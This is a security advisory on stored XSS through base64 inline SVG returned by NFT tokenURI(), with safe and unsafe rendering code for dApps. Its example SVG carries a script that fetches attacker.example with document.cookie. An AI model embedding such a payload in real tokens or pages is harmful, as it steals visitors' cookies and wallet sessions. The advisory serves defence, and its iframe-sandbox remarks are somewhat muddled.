# SVG tokenURI Security — Stored XSS Advisory

> **Severity:** HIGH — Stored XSS, permanently on-chain, affects all dApp visitors

## Summary

Arc Network's NFT ecosystem promotes returning base64-encoded inline SVG directly from ERC-721 `tokenURI()`. While elegant for on-chain storage, **SVG content is attacker-controlled** — any address that mints an NFT can embed `<script>` tags or event handlers inside the SVG.

If your dApp renders this SVG by injecting it into the DOM via `innerHTML` / `dangerouslySetInnerHTML`, the result is **stored cross-site scripting (XSS)**: the malicious SVG executes in your dApp's origin, gaining access to wallet state, localStorage, cookies, and auth tokens.

---

## The attack

An attacker encodes this SVG into the on-chain `tokenURI()`:

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch("https://attacker.example/steal?c="+document.cookie)</script>
  <rect width="100%" height="100%" fill="white"/>
</svg>
```

This SVG is stored **immutably on-chain** and executes for **every user** who visits the NFT gallery page.

---

## Root cause

| Rendering method | Safe? | Reason |
|---|---|---|
| `<img src="data:image/svg+xml;base64,...">` | ✅ Safe | Browser sandboxes SVG loaded as image — scripts cannot access parent document |
| `innerHTML` / `dangerouslySetInnerHTML` | ❌ UNSAFE | SVG is fully trusted, all scripts execute in the dApp origin |
| `iframe sandbox` | ✅ Safe (with caveats) | Sandbox attribute blocks script execution |

---

## Safe rendering

### ❌ UNSAFE — React

```tsx
// VULNERABLE — executes any <script> or onerror handler inside the SVG
<div dangerouslySetInnerHTML={{ __html: atob(nft.image.split(",")[1]) }} />
```

### ✅ SAFE — React / Next.js

```tsx
// SAFE — browser sandboxes SVG loaded as an image source
<img src={nft.image} alt={nft.name} />

// Or with next/legacy/image or next/image for optimization
import Image from "next/image";
<Image src={nft.image} alt={nft.name} width={400} height={400} />
```

### ✅ SAFE — Vanilla JS

```js
// SAFE
const img = document.createElement("img");
img.src = nft.image;
img.alt = nft.name;
container.appendChild(img);
```

### ✅ SAFE (interactive SVG) — iframe sandbox

If you need interactive SVG (e.g. pan/zoom), use a sandboxed iframe:

```html
<!-- SAFE — sandbox blocks script execution -->
<iframe
  srcdoc={svgContent}
  sandbox="allow-same-origin"
  style="width: 400px; height: 400px; border: none;"
/>
```

> **Note:** `allow-same-origin` is required for SVG interactivity but weakens the sandbox. Prefer `<img>` when possible.

---

## Verification checklist

- [ ] No `dangerouslySetInnerHTML` / `innerHTML` / `v-html` used for SVG content
- [ ] SVG rendered via `<img>` tag with `src={nft.image}`
- [ ] If iframe is used, `sandbox` attribute is present
- [ ] CSP headers restrict script-src to reduce blast radius
- [ ] Frontend team has been informed of this advisory
